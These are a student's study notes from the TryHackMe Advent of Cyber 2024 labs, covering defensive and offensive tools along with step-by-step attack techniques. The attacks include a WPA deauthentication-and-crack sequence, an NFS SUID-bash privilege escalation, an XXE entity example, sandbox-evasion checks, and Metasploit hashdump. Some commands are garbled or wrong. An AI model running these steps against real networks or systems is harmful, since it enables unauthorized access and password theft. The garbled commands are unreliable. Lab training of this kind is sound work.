<h1>
  
  [Advent of Cyber 2024](https://tryhackme.com/room/adventofcyber2024)
</h1>

Challenges delivered like an advent calendar with a storyline.<br>

<h2>Tools:</h2>

Elastic - cybersecurity threat detection, investigation, and response
* learned how to filter for specific events and information
* can use KQL (Kibana Query Language) to search

CyberChef - simple and complex data manipulation
* decode encoded data

CrackStation - Password Hash Cracker

Atomic Red - collection of red team test cases that can be executed to test for detection gaps <br>
* runs on powershell
* if you want to run on linux and mac install PowerShell Core
* invoke-atomictest (technique)
* parameters:
  * -ShowDetails: shows details of each test
  * -Checkprereq: check that all required resources are in place
  * -testnumbers (# of test): specify which test you want done
  * -cleanup: clean up artifacts from the test
 
Event Viewer - Windows tool that displays information about significant events happening on computer <br>

Burp Suite - Web application security testing and penetration testing. Intercepting, analyzing and modifying network traffic <br>
* Set up intercepting and modifying website requests: <br>
  * Settings -> Allow Brup's browser to run without a sandbox
  * Proxy -> Intercept -> Open Browser
  * In browser -> browse website
  * If website doesn't load change settings -> proxy -> request interception rule (all check) -> response interception rule (all check)
  * Proxy -> HTTP History
  * Find request to exploit -> send to repeater -> edit request -> Send
  * If you want to repeat exploit multiple times:
    * in request code box press ctrl+r how many times you want to execute exploit
    * click + icon and create tab group
    * send group sequence(one at a time) or parallel (at same time)
 
YARA - Tool used to identify and classify malware based on patterns in its code. Done by writing custom rules to scan for specific characteristics like particular strings, file headers, or behaviours.

Floss - Tool that extracts obfuscated strings from program
* `floss.exe (file path)`
* can pipe results to a txt file

CloudWatch - Monitors applications at multiple levels in AWS environment

CloudTrail - Monitors actions in AWS environment

JQ - transform and filter JSON data to be more understandable
* `jq '(what to filter by)' file`
* can pipe to filter more

msfvenom - generate payload and encoding it to evade detection

nc - reads and write to network conection using TCP or UDP (network listener)

Risk Assessment - identify potential problems before they happen

Group Policy Management Editor - allows administrators to enforce policies across domain
* open with windows + r -> gpmc.msc

Azure

Friga

PEStudio - software to investigate potentially malicious files and extract information from them without execution
* footprints - sections represent a memory space with different content of the executable
* indicators - shows potential indicators like URLs or other suspicious attributes

ILSpy - decompiles code so it's readable

Kubernetes - container orchestration system
* creates containers for microservices to balance the traffic coming in

Minikube - tool that runs a single node Kubernetes cluster on local machine for development and testing purposes
* `minikube start` - start minikube

pdftotext - convet pdf file to text file
* pdftotext (pdf file) -upw (Password)

exploit-db - public vulnerability database

enum4linux - enumerate SMB shares on linuc and windows systems
* enum4linux (options) (IP)

smbclient - allows user to access and manage files and resources on SMB server
* help - shows all commands that can be used
* get (file) - Downloads file
* cd (folder)\ - go into folder
* chmod (option) (file) - change permissions of files and directories

<h2>Languages:</h2>

XML (Extensible Markup Language) - language used to transport and store data
* Uses tags to label and organise information
* DTD (Document Type Definition) - set of rules that defines the structure of an XML document
* Entities - insertion of large chunks of data referencing internal or external files
  * ex: `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://normal-website.com" > ]>`
  * reference entity: `&ext;`


<h2>Commands:</h2>

Kali Linux:
* file - determines the type of file and its data
* exiftool - software used for reading, writing, and editing metadata
* cat etc/passwd - see what user's shell is set as
* lsb-release -a - shows what version of linux OS running
* nano (file name) - create and edit text files
* ./(.sh file) - run a .sh file

PowerShell:
* Select-String - find string in file (PowerShell grep equivalent)
  * `Select-String -Path "(file path)" '(string)'`
 
Windows:
* windows + r -> lusrmgr.msc - edit and look at user accounts
* System32 folders - critical files for operating system

<h2>Vulnerabilities:</h2>

XXE (XML External Entity) - Takes advantage of how XML handles external entities
* GOAL: Point external entity to malicious source or code
* Intercept requests with Burp Suite
* In browser -> browse website
* Proxy -> HTTP History
* Find request to exploit -> send to repeater -> edit request -> Send

Check if machine is a sandbox environment:
* Check if it has `C:\Program Files\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\ProgramFilesDir`
* If missing, machine is usually on sandbox or virtual environment
* Can make script to automate

Obfuscation - encode code that executes a vulnerability using base64 or other encoding
* Be careful of FLOSS

Reverse Shell - Target initiates connection to attacking machine
![create reverse shell payload using msfvenom](https://github.com/user-attachments/assets/aaabf49a-661d-49b7-bf64-e6b505b08884)

Malicious Document that uses macro:
![Malicious Macro Document](https://github.com/user-attachments/assets/99abee96-92ca-4d68-b979-2d85d6b9ed14)

Listen for incoming connections to establish exploit:
![Listen for incoming connections to establish exploit](https://github.com/user-attachments/assets/8d877b1c-bb98-4d60-9e12-1e82c6eac25e)

Wifi Attacks:
* sudo iw dev - shows wireless devices and their configuration
* sudo iw dev (device/interface) scan - scan nearby Wifi networks using the device
* sudo iw dev (device/interface) set type monitor - change device to monitor mode
  * turn device/interface off before doing this
  * turn device/interface on after
* sudo ip link set dev (device/interface) up - turn device on
* sudo ip link set dev (device/interface) down - turn device off
* sudo iw dev (device/interface) info - shows status of device
* sudo airodump-ng (device/interface) - shows list of nearby wifi networks and important details like encryption type
  * CAN QUITE WHEN FIND DESIRED NETWORK
* sudo airodump-ng -c (# channels to listen to) --bssid (bssid of network) -w output-file (device/interface) - targets specific network channel to capture traffic and save it files that start with output-file\
  * KEEP RUNNING
* Attack device connected to access point (BSSID under STATION section)
* open second terminal to launch deauthentication attack
  * using aireplay-ng to send deauthentication packets to disconnect wifi connection
  * capture reconnection 4-way handshake using airodump-ng that is being run
  * sudo aireplay-ng -0 1 -a (device/interface) -c (BSSID of device connected to access point)
* sudo aircrack-ng -a 2 -b (device/interface) -w /home/glitch/rockyou.txt output*cap - crack WPA/WPA2 passphrase using dictionary attack (using rockyou.txt word list)
* stop airodump-ng on first terminal
* wpa_passphrase MalwareM_AP (Pass Key) > config
* sudo wpa_supplicant -B -c config -i wlan2

Local DNS Override:
* Add website to/etc/hosts
* Doesn't alert external DNS servers
* Also may show that website uses self-signed certificate
* `echo "(Website IP) (website)" >> /etc/hosts`

Man in the Middle Attack on website using self-signed certificate:
* launch burp suite
* change settings
* don't need burp suite browser
* add ip of website and port to listen to on proxy listeners
* set own machine as gateway (other things not taught in module)
* run custom script that simulates user requests to website (have to use `chmod +x (script file)` on file before executing)
* burp suite will capture new user requests and shown as long as script and burp suite is running

Cracking hashed passwords:
* use tool `python hash-id.py` to identify possible hasing techniques used

Where passwords held:
* usually held C:\Windows\System32\config\sam

Some Passwords for different websites may be default:
* just search up website's default passwords

Broken Authentication:
* sometimes there's already user registered ex: (arthur)
* can register user with space beforehand ex: ( arthur)
* maybe gain access to arthur account

NFS
* allows system to share directories and files with others over a network
* access files remotely by mounting file system on a server that can be accessed
* use /usr/sbin/showmount -e (IP) - display information about NFS mounts on a system
* mkdir /tmp/mount - creates temporary directory to mount share to
* mount - make files and directories on file system accessible
* exploitation ex:
  * sudo mount -t nfs (IP):(mount) /tmp/mount/ -nolock
  * cp ~/Downloads/bash - copy bash shell
  * sudo chown root bash - become root user to run executable
  * sudo chmod +s bash - gives permission for file to be executed with the privileges of file's owner READ UP ON FILE PERMISSION FORMAT AND MEANINGS!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
  * ssh ./bash -p - runs bash executible with the permissions

SMTP:
* 

XSS
* Input code into text box
* Can use JavaScript, HTML, etc

Hydra
* open source tool used for network login cracking through brute-force attacks
* can be used with rockyou.txt

Robots.txt
* used to give instructions to web robots about locations within the web site that robots are allowed
* can be used to identify locations that are mentioned in file

Metasploit:
* msfconsole - starts metasploit framework
* search (vulnerability code) - searches for exploitation code and puts in a list
* use (# in list or exploit path) - use exploitation
  * puts you in the context of the exploit (specific settings for that exploit)
  * show options - shows context of exploit
  * show  (module type (auxiliary, payload, exploit, etc)) - shows chow context of module
  * info - shows more information
  * back - exit context
* set (parameter name) (value) - set parameters
  * if not set as a global variable parameter settings will change if you change module being used
* setg (parameter name) (value) - set global parameters
* unset - clear parameter value (can use unset all)
* unsetg - unset global parameters (can use unsetg all)
* exploit - launch module
* ctrl + z - run session in background
* show sessions - shows sessions
* sessions -i (id) - choose session
* ps - lists processes
* migrate (pid) - migrate to process
* hashdump - dump passwords on machine if you have correct privileges
